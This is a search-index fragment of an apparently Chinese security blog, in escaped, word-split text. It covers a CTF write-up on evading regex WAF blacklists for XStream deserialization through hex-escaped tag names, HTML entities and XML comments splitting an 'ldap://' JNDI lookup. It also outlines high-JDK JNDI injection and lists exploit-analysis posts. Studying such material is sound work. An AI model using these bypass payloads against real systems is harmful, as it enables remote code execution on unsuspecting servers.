\u5f53\u524d \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u4e3a   org [ . ] springframework   \uff0c \u6b64\u65f6 \u7684 \u7ed5\u8fc7 \u65b9\u6cd5 \u53ef\u4ee5 \u4e3a   < org . s _. 0070ringframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   < / org . s _. 0070ringframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u8fd9\u91cc \u7684 \u539f\u7406 \u5728\u4e8e xstream \u4f1a \u5bf9 \u7b26\u5408 \u683c\u5f0f \u7684 16 \u8fdb\u5236 \u505a \u8f6c\u6362   com . thoughtworks . xstream . io . xml . AbstractXmlReader # unescapeXmlName   com . thoughtworks . xstream . io . xml . XmlFriendlyNameCoder # decodeName   for   ( ;   i   <   length   ;   i   ++   )   {   char   c   =   name   .   charAt   (   i   ) ;   if   (   c   = =   dollarReplacementFirstChar   &&   name   .   startsWith   (   dollarReplacement   ,   i   ) )   {   i   + =   dollarReplacement   .   length   ( )   -   1   ;   result   .   append   (   ' $ '   ) ;   }   else   if   (   c   = =   hexPrefixFirstChar   &&   name   .   startsWith   (   hexPrefix   ,   i   ) )   {   / /   \u5904\u7406 hex \u683c\u5f0f \u7684 \u6807\u7b7e \u5185\u5bb9 \uff0c \u5176 \u6b63\u786e \u683c\u5f0f \u4e3a _. xxxx   i   + =   hexPrefix   .   length   ( ) ;   c   =   (   char   )   Integer   .   parseInt   (   name   .   substring   (   i   ,   i   +   4   ) ,   16   ) ;   i   + =   3   ;   result   .   append   (   c   ) ;   }   else   if   (   c   = =   escapeReplacementFirstChar   &&   name   .   startsWith   (   escapeCharReplacement   ,   i   ) )   {   i   + =   escapeCharReplacement   .   length   ( )   -   1   ;   result   .   append   (   ' _ '   ) ;   }   else   {   result   .   append   (   c   ) ;   }   }   \u4ece dollarReplacement \uff0c hexPrefix \uff0c escapeCharReplacement \u4e09\u8005 \u6765\u770b \uff0c \u6700\u7ec8 \u4e0d \u5f71\u54cd \u6211\u4eec \u7ed5\u8fc7 \u7684 \u4e3a 16 \u8fdb\u5236 \u7684 \u5904\u7406   _. xxxx   \u8f6c\u6362 \u6362\u6210 \u8f6c\u6362\u6210 \u5b9e\u9645 \u7684 \u5b57\u7b26 \u3002   \u9488\u5bf9 \u6807\u7b7e \u5c5e\u6027 \u5185\u5bb9 \u7684 \u7ed5\u8fc7   \u6848\u4f8b   < org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor   serialization =   \" custom \"   >   < / org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u6b64\u65f6 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u4e3a   custom   \uff0c \u90a3\u4e48 \u7ed5\u8fc7 \u65b9\u6cd5 \u53ef\u4ee5 \u4e3a   < org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor   serialization =   \" cust &# 111 ; m \"   >   < / org . springframework . aop . support . AbstractBeanFactoryPointcutAdvisor >   \u539f\u7406 \u4e3a \u8bfb\u53d6 \u5c5e\u6027 \u5185\u5bb9 \u65f6 \uff0c \u4f1a \u505a \u7b26\u5408 \u8981\u6c42 \u7b26\u5408\u8981\u6c42 \u7684 \u8f6c\u5316   com . sun . org . apache . xerces . internal . impl . XMLScanner   scanAttributeValue   \u8be5 \u51fd\u6570 \u5185\u5bb9 \u6bd4\u8f83 \u591a \uff0c \u4e0d \u8d34\u51fa \u51fa\u6765 \u8d34\u51fa\u6765 \u4e86 \uff0c \u4ece 883 \u884c\u5230 942 \u884c\u5747 \u5728 \u5904\u7406 html \u7f16\u7801 \u683c\u5f0f \uff0c \u5e76 \u5c06 \u5176 \u8f6c\u5316 \u4e3a \u5b9e\u9645 \u7684 \u5b57\u7b26   \u6240\u4ee5 \u8fd9\u91cc   &# 111 ;   \u5c06 \u8f6c\u5316 \u4e3a   o   \u9488\u5bf9 \u6807\u7b7e \u5185\u5bb9 \u7684 \u7ed5\u8fc7   \u6848\u4f8b   < test >   ldap : / / xxxxx   < / test >   \u6b64\u65f6 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u4e3a   ldap : / /   \uff0c \u53ef\u4ee5 \u7528 \u5982\u4e0b \u7684 \u51e0\u79cd \u65b9\u6cd5 \u7ed5\u8fc7   a .   html \u7f16\u7801   \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u5728 \u63d0\u53d6 \u6570\u636e \u65f6 \uff0c \u540c\u6837 \u5bf9 html \u7f16\u7801 \u7684 \u5185\u5bb9 \u505a \u4e86 \u8f6c\u5316   < test >   &# 108 ;   dap : / / xxxxx   < / test >   \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u8ddf \u4e0a\u9762   \u6807\u7b7e \u5c5e\u6027 \u5185\u5bb9 \u7684 \u7ed5\u8fc7   \u7684 \u4e00\u6837 \uff0c \u4e0d\u518d \u53d9\u8ff0   b .   \u6ce8\u91ca \u7684 \u65b9\u6cd5   \u5728 \u5904\u7406 \u5b9e\u9645 \u7684 \u6807\u7b7e \u5185\u5bb9 \u65f6 \uff0c \u9047\u5230 \u6ce8\u89c6 \u5185\u5bb9 \u5c06 \u88ab \u5ffd\u7565 \u6389   < test >   ld   < ! --   test   -- >   ap : / / xxxxx   < / test >   com . thoughtworks . xstream . converters . reflection . AbstractReflectionConverter # unmarshallField   com . thoughtworks . xstream . io . xml . AbstractPullReader # getValue   public   String   getValue   ( )   {   / /   ...   Event   event   =   readEvent   ( ) ;   while   (   true   )   {   if   (   event   .   type   = =   TEXT   )   {   / /   \u5904\u7406 \u5b57\u7b26   String   text   =   event   .   value   ;   if   (   text   ! =   null   &&   text   .   length   ( )   >   0   )   {   if   (   last   = =   null   )   {   last   =   text   ;   }   else   {   if   (   buffer   = =   null   )   {   buffer   =   new   StringBuffer   (   last   ) ;   }   buffer   .   append   (   text   ) ;   }   }   }   else   if   (   event   .   type   ! =   COMMENT   )   {   / /   \u975e \u5b57\u7b26   \u4e14   \u4e0d\u662f \u6ce8\u91ca \u65f6   \u8df3\u51fa   break   ;   }   event   =   readEvent   ( ) ;   / /   \u7ee7\u7eed   }   reset   ( ) ;   if   (   buffer   ! =   null   )   {   return   buffer   .   toString   ( ) ;   }   else   {   return   (   last   = =   null   )   ?   \" \"   :   last   ;   }   }   \u4ece \u524d\u9762 \u7684 \u4ee3\u7801 \u4e2d \u6765\u770b \uff0c \u8fd9\u91cc \u4e3b\u8981 \u5728 \u5bf9 \u5b57\u7b26 \u8fdb\u884c \u62fc\u63a5 \uff0c \u5e76\u4e14 \u9047\u5230 \u6ce8\u91ca \u65f6 \u5c06 \u8df3 \u8fc7 \uff0c \u6240\u4ee5 \u5982\u679c \u5728 \u5185\u5bb9 \u4e2d\u6dfb \u4e0a \u6ce8\u91ca \u4e5f \u80fd \u8fbe\u5230 \u7ed5\u8fc7 \u7684 \u6548\u679c   \u7ecf\u8fc7 \u4e0a\u9762 XStream \u7c7b\u578b \u89e3\u6790 \u5206\u6790 \uff0c \u6211\u4eec \u53ef\u4ee5 \u6784\u9020 \u51fa \u7ed5\u8fc7 \u6b63\u5219 waf \u7684 payload \u6765","title":"# 4   XStream \u6b63\u5219 waf \u7ed5\u8fc7"},{"location":"writeups/2020/xnuca-2020-easyjava/#5-jndi","text":"\u5728 \u751f\u6210 \u5177\u4f53 \u7684 exp \u540e \uff0c \u53ef\u4ee5 \u5bf9\u5916 \u53d1\u8d77 JNDI \u8fde\u63a5 \uff0c \u5230 \u8fd9 \u4e00\u6b65 \uff0c \u6211\u4eec \u9700\u8981 \u53bb \u5224\u65ad \u5176\u4e3a \u9ad8 \u7248\u672c jdk \u8fd8\u662f \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u7684 jdk \u3002 \u5982\u679c \u662f \u4f4e\u7248 \u7248\u672c \u4f4e\u7248\u672c \u7684 jdk \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u5229\u7528 codebase \u52a0\u8f7d \u4efb\u610f \u7684 class \u6765 \u8fbe\u5230 \u547d\u4ee4 \u6267\u884c \u7684 \u6548\u679c \uff0c \u800c \u9ad8 \u7248\u672c \u7684 jdk \u53ea\u80fd \u4f9d\u8d56 \u672c\u5730 ObjectFactory \u6216 \u672c\u5730 \u5229\u7528 \u94fe\u6765 \u8fdb\u884c \u653b\u51fb \uff0c \u53c2\u8003   KINGX \u7684 \u6587\u7ae0   \u3002   \u800c \u672c\u9898 \u8003\u67e5 \u7684 \u4e3a \u9ad8 \u7248\u672c jdk \u73af\u5883 \u4e0b \u7684 \u5229\u7528 \uff0c \u90a3\u4e48 \u5c31 \u6709 \u4e24\u79cd \u9009\u62e9 \uff0c \u4e00\u4e3a \u672c\u5730 \u5229\u7528 \u94fe \u89e6\u53d1 \u547d\u4ee4 \u6765 \u6267\u884c \uff0c \u4e8c\u4e3a \u672c\u5730 ObjectFactory \u8fbe\u6210 \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u3002   \u4ece \u9898\u76ee \u7684 \u4f9d\u8d56 \u6765\u770b \uff0c \u6211\u4eec \u5e76 \u4e0d\u80fd \u627e\u5230 \u4e00\u4e2a \u5408\u9002 \u7684 \u672c\u5730 \u5229\u7528 \u94fe\u6765 \u8fbe\u6210 \u5229\u7528 \uff0c \u90a3\u4e48 \u8003\u5bdf \u7684 \u5c31\u662f \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u65b9\u6cd5 \u7684 \u5229\u7528 \u4e86 \u3002 \u56e0\u4e3a \u9898\u76ee \u7528 \u7684 \u662f spring   boot   embedded   tomcat \uff0c \u6240\u4ee5 \u6211\u4eec \u80fd \u76f4\u63a5 \u5229\u7528 KINGX \u5e08\u5085 \u6587\u7ae0 \u4e2d \u63d0\u5230 \u7684 \u65b9\u6cd5 \uff0c \u5177\u4f53 \u7684 \u5229\u7528 \u8fc7\u7a0b \u4e0d\u63d0 \u4e86 \uff0c \u53ef\u4ee5 \u7528 \u6211 \u7684 ysomap \u6765 \u8fbe\u6210 \u547d\u4ee4 \u6267\u884c \u7684 \u6548\u679c","title":"# 5   \u9ad8 \u7248\u672c JNDI \u6ce8\u5165 \u7684 \u5229\u7528"},{"location":"writeups/2020/xnuca-2020-easyjava/#0x02-exp","text":"exp . java","title":"0x02   exp"},{"location":"","text":"ctf   DDCTF   2018   web   writeup   HITB - XCTF   2018   web   writeup   python   sandbox   escape   SUCTF   2018   \u90e8\u5206 web   writeup   xnuca2020   easyjava \u8bbe\u8ba1 \u601d\u8def   java   Struts2 \u547d\u4ee4 \u6267\u884c \u5404 \u7248\u672c \u8bb0\u5f55   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections1   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections3   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections5 , 6 , 7 , 9 , 10   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections2 , 4 , 8   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b Shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u653b\u51fb Java   JMX - RMI   JNDI   with   LDAP   JNDI   with   RMI   \u6d45\u8c08 Java   RMI   Registry \u5b89\u5168 \u95ee\u9898   \u6d45\u8c08 fastjson \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u56de\u987e XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   struts2 \u5386\u53f2 \u6f0f\u6d1e \u5206\u6790   \u5982\u4f55 \u9ad8\u6548 \u7684 \u6316\u6398 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   \u5982\u4f55 \u9ad8\u6548 \u5730 \u6361\u6f0f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   XStream   1.4 . 15   Blacklist   Bypass   \u6f0f\u6d1e \u5206\u6790   MYSQL \u63d0\u6743 \u5206\u6790   CVE - 2016 - 5195   Dirtycow   wordpress   SSRF   < 4.5   bluecms   v1.6   Sql   Injection   \u5206\u6790   DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf \u524d\u53f0 \u76f2\u6ce8   seacms   v6.5   \u524d\u53f0 getshell   MovieGuide   v2.0   SQLi   mycncart   sqli   temmoku   home \u7248   t1.15   \u524d\u53f0 sqli   thinkphp   v5 . x   App . php   s \u53c2\u6570 RCE   thinkphp   v5.2 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398   thinkphp   v6.0 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398","title":"Home"},{"location":"#ctf","text":"DDCTF   2018   web   writeup   HITB - XCTF   2018   web   writeup   python   sandbox   escape   SUCTF   2018   \u90e8\u5206 web   writeup   xnuca2020   easyjava \u8bbe\u8ba1 \u601d\u8def","title":"ctf"},{"location":"#java","text":"Struts2 \u547d\u4ee4 \u6267\u884c \u5404 \u7248\u672c \u8bb0\u5f55   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections1   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections3   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections5 , 6 , 7 , 9 , 10   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections2 , 4 , 8   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b Shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u653b\u51fb Java   JMX - RMI   JNDI   with   LDAP   JNDI   with   RMI   \u6d45\u8c08 Java   RMI   Registry \u5b89\u5168 \u95ee\u9898   \u6d45\u8c08 fastjson \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u56de\u987e XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   struts2 \u5386\u53f2 \u6f0f\u6d1e \u5206\u6790   \u5982\u4f55 \u9ad8\u6548 \u7684 \u6316\u6398 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   \u5982\u4f55 \u9ad8\u6548 \u5730 \u6361\u6f0f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   XStream   1.4 . 15   Blacklist   Bypass","title":"java"},{"location":"#_1","text":"MYSQL \u63d0\u6743 \u5206\u6790   CVE - 2016 - 5195   Dirtycow   wordpress   SSRF   < 4.5   bluecms   v1.6   Sql   Injection   \u5206\u6790   DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf \u524d\u53f0 \u76f2\u6ce8   seacms   v6.5   \u524d\u53f0 getshell   MovieGuide   v2.0   SQLi   mycncart   sqli   temmoku   home \u7248   t1.15   \u524d\u53f0 sqli   thinkphp   v5 . x   App . php   s \u53c2\u6570 RCE   thinkphp   v5.2 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398   thinkphp   v6.0 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398","title":"\u6f0f\u6d1e \u5206\u6790"}]}